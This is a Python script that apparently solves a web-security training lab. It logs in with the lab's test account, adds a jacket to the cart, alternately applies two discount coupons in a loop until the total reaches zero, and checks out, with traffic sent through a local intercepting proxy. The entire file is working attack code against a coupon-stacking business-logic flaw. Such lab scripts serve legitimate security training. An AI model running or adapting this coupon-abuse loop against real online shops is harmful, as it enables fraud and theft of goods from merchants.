#!/usr/bin/env python3
import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
from itertools import cycle
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url + "/login", verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf"})
    return csrf["value"]

def get_cart_csrf(s, url):
    r = s.get(url + "/cart", verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    return soup.find("input", {"name": "csrf"})["value"]

def get_cart_price(s, url):
    r = s.get(url + "/cart", verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    for row in soup.find_all("tr"):
        if "Total:" in row.text:
            match = re.search(r"\$([0-9]+\.[0-9]{2})", row.text)
            if match:
                return float(match.group(1))
    return None

def login(s, url):
    login_page = url + "/login"
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf, "username": "wiener", "password": "peter"}
    r = s.post(login_page, data=data, verify=False, allow_redirects=True, proxies=proxies, timeout=10)
    if "Log out" in r.text:
        return True
    return False

def add_to_cart(s, url):
    print("[*] Adding jacket to cart...")
    cart_url = url + "/cart"
    data = {"productId": "1", "redir": "PRODUCT", "quantity": "1"}
    r = s.post(cart_url, data=data, verify=False, allow_redirects=True, proxies=proxies, timeout=10)
    if r.status_code == 200:
        return True
    return False

def discount_codes(s, url):
    print("[*] Applying discount codes...")
    for code in cycle(("NEWCUST5", "SIGNUP30")):
        csrf = get_cart_csrf(s, url)
        s.post(f"{url}/cart/coupon", data={"csrf": csrf, "coupon": code},
               verify=False, proxies=proxies, timeout=10)
        price = get_cart_price(s, url)
        if price is None:
            print("[-] Could not read price, stopping")
            return
        print(f"[+] Coupon: {code} -> Price: ${price:.2f}")
        if price <= 0.00:
            return

def checkout(s, url):
    print("[*] Checking out...")
    checkout_url = url + "/cart/checkout"
    csrf = get_cart_csrf(s, url)
    data = {"csrf": csrf}
    r = s.post(checkout_url, data=data, verify=False, proxies=proxies, timeout=10)
    if "Your order is on its way!" in r.text:
        print("[+] Checkout successful - Lab solved!")
    else:
        print("[-] Error with checkout")

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    if not login(s, url):
        print("[-] Login failed")
        return
    print("[+] Login successful")

    add_to_cart(s, url)
    discount_codes(s, url)
    checkout(s, url)

if __name__ == "__main__":
    main()